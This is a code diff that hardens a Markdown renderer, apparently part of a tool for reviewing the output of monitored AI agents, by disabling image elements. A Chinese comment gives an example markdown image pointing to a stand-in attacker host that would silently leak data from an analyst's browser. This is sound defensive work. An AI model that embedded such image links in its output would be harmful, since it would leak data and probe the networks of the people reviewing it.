@@ -72,7 +72,15 @@ const components: ComponentProps<typeof ReactMarkdown>['components'] = {
 export function Markdown({ children }: { children: string }) {
   return (
     <div className="space-y-2.5">
-      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
+      {/* 渲染的是模型/被监控智能体回复(不可信内容)。react-markdown 默认已丢弃裸 HTML(无
+          rehype-raw),此处再禁掉 <img>:否则 ![](http://attacker/x?d=…) 会在分析师浏览器
+          自动外带数据 / 探内网。unwrapDisallowed 保留其 alt 文本,不影响正常阅读。 */}
+      <ReactMarkdown
+        remarkPlugins={[remarkGfm]}
+        components={components}
+        disallowedElements={['img']}
+        unwrapDisallowed
+      >
         {children}
       </ReactMarkdown>
     </div>
